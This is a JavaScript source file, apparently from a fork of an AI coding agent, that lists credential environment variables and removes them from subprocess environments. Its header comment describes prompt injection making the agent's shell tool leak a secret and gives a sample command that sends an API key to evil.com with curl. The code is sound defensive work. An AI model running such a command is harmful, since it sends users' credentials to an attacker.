// Secret/credential env vars stripped from subprocess environments when the
// CLAUDE_CODE_SUBPROCESS_ENV_SCRUB gate is enabled (GitHub Actions / untrusted-
// content contexts). This stops prompt-injection from exfiltrating a secret via
// shell expansion (e.g. `curl evil.com -d "$DEEPSEEK_API_KEY"`) in a Bash tool
// command. The parent process keeps these (it re-reads them per request); only
// child processes (bash, shell snapshot, MCP stdio, LSP, hooks) are scrubbed.
//
// This is the single source of truth for the scrub set — kept here as a pure,
// node-testable leaf so the list can't silently drift from what the provider
// actually treats as a credential.
export const SUBPROCESS_SCRUB_KEYS = [
  // DeepSeek / DeepCode auth — the fork's REAL credentials. These are exactly the
  // vars the provider resolves an API key from (provider-config.mjs apiKey arrays
  // ['DEEPSEEK_API_KEY'] and ['DEEPCODE_API_KEY','API_KEY']; deepseek.mjs reads
  // DEEPSEEK_API_KEY/DEEPCODE_API_KEY). `API_KEY` is generic but IS a documented
  // credential source for the deepcode provider, so it must be scrubbed too.
  'DEEPSEEK_API_KEY',
  'DEEPCODE_API_KEY',
  'API_KEY',

  // Anthropic auth — re-read per request, subprocesses don't need them
  'ANTHROPIC_API_KEY',
  'CLAUDE_CODE_OAUTH_TOKEN',
  'ANTHROPIC_AUTH_TOKEN',
  'ANTHROPIC_FOUNDRY_API_KEY',
  'ANTHROPIC_CUSTOM_HEADERS',

  // OTLP exporter headers — documented to carry Authorization=Bearer tokens
  // for monitoring backends; read in-process by OTEL SDK, subprocesses never need them
  'OTEL_EXPORTER_OTLP_HEADERS',
  'OTEL_EXPORTER_OTLP_LOGS_HEADERS',
  'OTEL_EXPORTER_OTLP_METRICS_HEADERS',
  'OTEL_EXPORTER_OTLP_TRACES_HEADERS',

  // Cloud provider creds — same pattern (lazy SDK reads)
  'AWS_SECRET_ACCESS_KEY',
  'AWS_SESSION_TOKEN',
  'AWS_BEARER_TOKEN_BEDROCK',
  'GOOGLE_APPLICATION_CREDENTIALS',
  'AZURE_CLIENT_SECRET',
  'AZURE_CLIENT_CERTIFICATE_PATH',

  // GitHub Actions OIDC — consumed by the action's JS before the agent spawns;
  // leaking these allows minting an App installation token → repo takeover
  'ACTIONS_ID_TOKEN_REQUEST_TOKEN',
  'ACTIONS_ID_TOKEN_REQUEST_URL',

  // GitHub Actions artifact/cache API — cache poisoning → supply-chain pivot
  'ACTIONS_RUNTIME_TOKEN',
  'ACTIONS_RUNTIME_URL',

  // action-specific duplicates — action JS consumes these during prepare, before
  // spawning the agent. ALL_INPUTS contains the api key as JSON.
  'ALL_INPUTS',
  'OVERRIDE_GITHUB_TOKEN',
  'DEFAULT_WORKFLOW_TOKEN',
  'SSH_SIGNING_KEY',
]

/**
 * Returns a scrubbed COPY of `env` with every secret key (and its GitHub Actions
 * `INPUT_<KEY>` duplicate — GHA auto-creates these for `with:` inputs) removed.
 * Pure: does not mutate the input.
 *
 * @param {Record<string, string | undefined>} env
 * @param {ReadonlyArray<string>} [keys]
 * @returns {Record<string, string | undefined>}
 */
export function scrubSubprocessEnv(env, keys = SUBPROCESS_SCRUB_KEYS) {
  const out = { ...env }
  for (const k of keys) {
    delete out[k]
    delete out[`INPUT_${k}`]
  }
  return out
}
